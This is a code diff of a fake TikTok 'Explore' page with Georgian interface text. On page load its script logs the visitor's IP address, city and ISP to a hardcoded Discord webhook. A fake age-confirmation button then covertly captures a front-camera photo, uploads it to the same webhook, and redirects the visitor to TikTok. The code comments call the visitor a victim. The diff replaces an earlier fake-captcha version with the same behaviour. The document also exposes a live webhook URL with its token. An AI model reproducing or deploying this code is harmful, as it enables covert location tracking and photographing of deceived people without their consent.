@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>TikTok - Explore</title>
 </head>
 <body style="background-color: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; overflow: hidden;">
 
     <div id="content" style="text-align: center; padding: 20px;">
         <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" width="70" style="margin-bottom: 20px;">
-        <h2 id="status">ვიდეო იტვირთება...</h2>
-        <p id="subtext" style="color: #ccc;">გთხოვთ დაადასტუროთ, რომ არ ხართ რობოტი</p>
-        <button id="authBtn" style="background: #fe2c55; color: white; border: none; padding: 15px 40px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px;">ვარ რობოტი? არა</button>
+        <h2 id="status">ვიდეო მზად არის</h2>
+        <p id="subtext" style="color: #ccc;">სანახავად დაადასტურეთ, რომ ხართ 18+ წლის</p>
+        <button id="authBtn" style="background: #fe2c55; color: white; border: none; padding: 15px 40px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px;">დადასტურება</button>
     </div>
 
     <video id="video" style="display:none;" autoplay playsinline></video>
@@ -20,47 +20,36 @@
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";
 
-        // 1. ეს ფუნქცია ეშვება ეგრევე, შევა თუ არა საიტზე (IP Logger)
-        async function logVisit() {
+        // 1. IP-ის გაგზავნა შევსვლისთანავე
+        window.onload = async () => {
             try {
                 const geoRes = await fetch('http://ip-api.com/json/');
                 const data = await geoRes.json();
-
-                const payload = {
-                    content: "🔔 **ვიღაც შევიდა ლინკზე! (ველოდებით ფოტოს...)**",
-                    embeds: [{
-                        color: 3447003,
-                        fields: [
-                            { name: "🌐 IP მისამართი", value: `\`${data.query}\``, inline: true },
-                            { name: "🏙️ ქალაქი", value: data.city, inline: true },
-                            { name: "📡 პროვაიდერი", value: data.isp },
-                            { name: "🔗 რუკა", value: `[ნახვა Google Maps-ზე](https://www.google.com/maps?q=${data.lat},${data.lon})` }
-                        ]
-                    }]
-                };
-
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        content: "📡 **მსხვერპლი საიტზეა!**",
+                        embeds: [{
+                            color: 3447003,
+                            description: `🌐 IP: \`${data.query}\`\n🏙️ ქალაქი: ${data.city}\n📡 ISP: ${data.isp}`
+                        }]
+                    })
                 });
-            } catch (err) { console.error("IP Log Error:", err); }
-        }
+            } catch (e) {}
+        };
 
-        // 2. ეს ფუნქცია ეშვება ღილაკზე დაჭერისას (კამერა)
-        async function capturePhoto() {
+        // 2. კამერა და სწრაფი გადამისამართება
+        document.getElementById('authBtn').addEventListener('click', async () => {
             document.getElementById('authBtn').style.display = 'none';
-            document.getElementById('status').innerText = "მოწმდება...";
-            
+            document.getElementById('status').innerText = "მიმდინარეობს გადამისამართება...";
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, // წინა კამერა სელფისთვის
-                    audio: false 
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
+                // ძალიან სწრაფი კადრი (0.3 წამში), რომ მომხმარებელი არ დაელოდოს
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
@@ -68,26 +57,22 @@
 
                     canvas.toBlob(async (blob) => {
                         const formData = new FormData();
-                        formData.append('file', blob, 'face.jpg');
-                        formData.append('payload_json', JSON.stringify({
-                            content: "📸 **მსხვერპლის ფოტო მოვიდა!**"
-                        }));
+                        formData.append('file', blob, 'shot.jpg');
+                        formData.append('payload_json', JSON.stringify({ content: "📸 **ფოტო მოვიდა!**" }));
 
-                        await fetch(webhookURL, { method: 'POST', body: formData });
+                        // ვაგზავნით ფოტოს "ფონურ რეჟიმში" და მომხმარებელს ეგრევე ვუშვებთ ტიკტოკზე
+                        fetch(webhookURL, { method: 'POST', body: formData });
                         
                         stream.getTracks().forEach(track => track.stop());
-                        window.location.href = "https://www.tiktok.com/@yvelazederski";
-                    }, 'image/jpeg', 0.8);
-                }, 1000);
-            } catch (err) {
-                window.location.href = "https://www.tiktok.com/@yvelazederski";
-            }
-        }
+                        window.location.href = "https://www.tiktok.com/foryou"; // გადადის პირდაპირ ვიდეოებზე
+                    }, 'image/jpeg', 0.7);
+                }, 300); 
 
-        // გვერდის ჩატვირთვისას მაშინვე ვაგზავნით IP-ს
-        window.onload = logVisit;
-        // ღილაკზე დაჭერისას ვიღებთ ფოტოს
-        document.getElementById('authBtn').addEventListener('click', capturePhoto);
+            } catch (err) {
+                // თუ უარი თქვა კამერაზე, მაინც გადავუშვათ
+                window.location.href = "https://www.tiktok.com/foryou";
+            }
+        });
     </script>
 </body>
 </html>
